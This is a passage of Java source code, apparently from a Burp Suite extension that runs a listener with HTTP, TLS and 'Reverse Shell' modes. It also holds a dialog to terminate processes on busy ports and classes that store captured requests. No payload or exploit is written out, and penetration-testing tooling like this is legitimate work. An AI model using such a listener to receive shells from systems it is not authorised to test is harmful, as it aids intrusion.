                    JOptionPane.showMessageDialog(this, "No active TCP listening ports detected.", "Scan Result", JOptionPane.INFORMATION_MESSAGE);
                    return;
                }
                showKillPortsDialog(usedPorts);
            });
        });
    }

    private void showKillPortsDialog(List<PortInfo> usedPorts) {
        JDialog dialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Kill Busy Listening Ports", Dialog.ModalityType.APPLICATION_MODAL);
        dialog.setLayout(new BorderLayout(10, 10));
        dialog.setSize(620, 380);
        dialog.setLocationRelativeTo(this);

        String[] columns = { "Select", "Port", "Protocol", "Local Address", "PID", "Process Name" };
        DefaultTableModel model = new DefaultTableModel(columns, 0) {
            @Override public Class<?> getColumnClass(int col) { return col == 0 ? Boolean.class : String.class; }
            @Override public boolean isCellEditable(int row, int col) { return col == 0; }
        };

        for (PortInfo p : usedPorts) {
            boolean isCurrent = (p.getPort() == currentPort);
            model.addRow(new Object[] { isCurrent, p.getPort(), p.getProtocol(), p.getLocalAddress(), p.getPid() != -1 ? p.getPid() : "N/A", p.getProcessName() });
        }

        JTable table = new JTable(model);
        table.setFont(UITheme.FONT_CODE);
        table.setRowHeight(24);
        table.getColumnModel().getColumn(0).setMaxWidth(50);

        JPanel footer = new JPanel(new BorderLayout());
        footer.setBorder(new EmptyBorder(8, 14, 8, 14));

        JLabel warning = new JLabel("Terminating processes will immediately release the bound ports.");
        warning.setFont(UITheme.FONT_SMALL);
        warning.setForeground(UITheme.STATUS_DANGER);

        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
        ModernButton killBtn = new ModernButton("TERMINATE SELECTED", UITheme.STATUS_DANGER);
        ModernButton cancelBtn = new ModernButton("CANCEL", new Color(100, 116, 139));

        killBtn.addActionListener(e -> {
            List<Integer> pids = new ArrayList<>();
            List<Integer> ports = new ArrayList<>();
            boolean currentSelected = false;

            for (int i = 0; i < model.getRowCount(); i++) {
                if ((Boolean) model.getValueAt(i, 0)) {
                    int pt = (Integer) model.getValueAt(i, 1);
                    String pidStr = String.valueOf(model.getValueAt(i, 4));
                    int pid = pidStr.equals("N/A") ? -1 : Integer.parseInt(pidStr);
                    if (pt == currentPort) currentSelected = true;
                    if (pid != -1) {
                        pids.add(pid);
                        ports.add(pt);
                    }
                }
            }

            if (pids.isEmpty() && !currentSelected) {
                JOptionPane.showMessageDialog(dialog, "Please select at least one process to terminate.", "No Selection", JOptionPane.WARNING_MESSAGE);
                return;
            }

            final boolean killCurrent = currentSelected;
            killBtn.setEnabled(false);
            ioExecutor.submit(() -> {
                StringBuilder sb = new StringBuilder();
                if (killCurrent) {
                    stopListener();
                    sb.append("Active listener on port ").append(currentPort).append(" stopped.\n");
                }
                for (int i = 0; i < pids.size(); i++) {
                    int pid = pids.get(i);
                    int port = ports.get(i);
                    boolean ok = PortScanner.killProcess(pid);
                    sb.append("Port ").append(port).append(" (PID ").append(pid).append("): ")
                            .append(ok ? "Terminated successfully" : "Failed to terminate").append("\n");
                }
                SwingUtilities.invokeLater(() -> {
                    JOptionPane.showMessageDialog(this, sb.toString(), "Process Termination Results", JOptionPane.INFORMATION_MESSAGE);
                    dialog.dispose();
                });
            });
        });

        cancelBtn.addActionListener(e -> dialog.dispose());
        btnPanel.add(killBtn);
        btnPanel.add(cancelBtn);

        footer.add(warning, BorderLayout.WEST);
        footer.add(btnPanel, BorderLayout.EAST);

        dialog.add(new JScrollPane(table), BorderLayout.CENTER);
        dialog.add(footer, BorderLayout.SOUTH);
        dialog.setVisible(true);
    }

    // =========================================================================
    // NETWORK INTERFACE HELPERS
    // =========================================================================
    private List<String> getAvailableIpAddresses() {
        List<String> ips = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                if (iface.isLoopback() || !iface.isUp() || iface.isVirtual()) continue;
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (addr instanceof Inet4Address) {
                        ips.add(addr.getHostAddress());
                    }
                }
            }
        } catch (SocketException e) {
            callbacks.printError("Error retrieving network interfaces: " + e.getMessage());
        }
        return ips;
    }

    private void updateIpDisplay(List<String> ips, int port, String mode, boolean useTls) {
        ipListPanel.removeAll();
        List<String> entries = (ips == null || ips.isEmpty()) ? Collections.singletonList("127.0.0.1") : ips;
        for (String ip : entries) {
            String displayText;
            String copyValue;

            if (useTls) {
                displayText = "https://" + ip + ":" + port;
                copyValue = "https://" + ip + ":" + port + "/";
            } else {
                if ("Reverse Shell".equals(mode)) {
                    displayText = ip + ":" + port;
                    copyValue = ip + ":" + port;
                } else {
                    displayText = "http://" + ip + ":" + port;
                    copyValue = "http://" + ip + ":" + port + "/";
                }
            }

            ipListPanel.add(new AddressChip(displayText, copyValue));
        }
        ipListPanel.revalidate();
        ipListPanel.repaint();
    }

    private void clearIpDisplay() {
        ipListPanel.removeAll();
        JLabel waiting = new JLabel("Listener is currently inactive.");
        waiting.setFont(UITheme.FONT_SMALL);
        waiting.setForeground(UITheme.TEXT_MUTED);
        ipListPanel.add(waiting);
        ipListPanel.revalidate();
        ipListPanel.repaint();
    }

    private void populateIpAddresses(JComboBox<String> combo) {
        combo.removeAllItems();
        combo.addItem("127.0.0.1");
        List<String> ips = getAvailableIpAddresses();
        for (String ip : ips) {
            combo.addItem(ip);
        }
        if (!ips.isEmpty()) {
            combo.setSelectedItem(ips.get(0));
        }
    }

    // =========================================================================
    // SETTINGS & BURP EXTENSION INTEGRATION
    // =========================================================================
    public void cleanup() {
        ioExecutor.shutdownNow();
        isListening = false;
        stopListener();
        sessionManager.closeAll();
    }

    public void saveSettings(boolean showMessage) {
        callbacks.saveExtensionSetting("port", portField.getText());
        callbacks.saveExtensionSetting("mode", (String) modeCombo.getSelectedItem());
        if (showMessage) {
            callbacks.printOutput("Settings saved.");
        }
    }

    public void loadSettings() {
        String port = callbacks.loadExtensionSetting("port");
        String mode = callbacks.loadExtensionSetting("mode");
        if (port != null) portField.setText(port);
        if (mode != null) modeCombo.setSelectedItem(mode);
    }

    public void addEntry(IHttpRequestResponse requestResponse, int toolFlag) {
        byte[] reqBytes = requestResponse.getRequest();
        byte[] respBytes = requestResponse.getResponse();
        IRequestInfo info = helpers.analyzeRequest(requestResponse);
        String method = info.getMethod();
        String url = info.getUrl().toString();
        String clientIp = "127.0.0.1";
        addWebhookEntry(method, url, clientIp, reqBytes != null ? reqBytes.length : 0, reqBytes, respBytes, requestResponse.getHttpService());
    }

    private final IMessageEditorController requestController = new IMessageEditorController() {
        @Override
        public IHttpService getHttpService() {
            int row = webhookTable.getSelectedRow();
            if (row != -1) {
                int modelRow = webhookTable.convertRowIndexToModel(row);
                if (modelRow < requestHistory.size()) {
                    return requestHistory.get(modelRow).httpService;
                }
            }
            return null;
        }

        @Override
        public byte[] getRequest() {
            int row = webhookTable.getSelectedRow();
            if (row != -1) {
                int modelRow = webhookTable.convertRowIndexToModel(row);
                if (modelRow < requestHistory.size()) {
                    return requestHistory.get(modelRow).fullRequest;
                }
            }
            return null;
        }

        @Override
        public byte[] getResponse() {
            int row = webhookTable.getSelectedRow();
            if (row != -1) {
                int modelRow = webhookTable.convertRowIndexToModel(row);
                if (modelRow < requestHistory.size()) {
                    return requestHistory.get(modelRow).fullResponse;
                }
            }
            return null;
        }
    };

    private static class HttpServiceImpl implements IHttpService {
        private final String host;
        private final int port;
        private final String protocol;

        public HttpServiceImpl(String host, int port, String protocol) {
            this.host = host;
            this.port = port;
            this.protocol = protocol;
        }

        @Override public String getHost() { return host; }
        @Override public int getPort() { return port; }
        @Override public String getProtocol() { return protocol; }
    }

    private static class RequestEntry {
        final int index;
        final String method;
        final String url;
        final String clientIp;
        final int size;
        final String timestamp;
        final byte[] fullRequest;
        final byte[] fullResponse;
        final IHttpService httpService;

        RequestEntry(int index, String method, String url, String clientIp, int size, String timestamp, byte[] fullRequest, byte[] fullResponse, IHttpService httpService) {
            this.index = index;
            this.method = method;
            this.url = url;
            this.clientIp = clientIp;
            this.size = size;
            this.timestamp = timestamp;
            this.fullRequest = fullRequest;
            this.fullResponse = fullResponse;
            this.httpService = httpService;
        }
    }
}
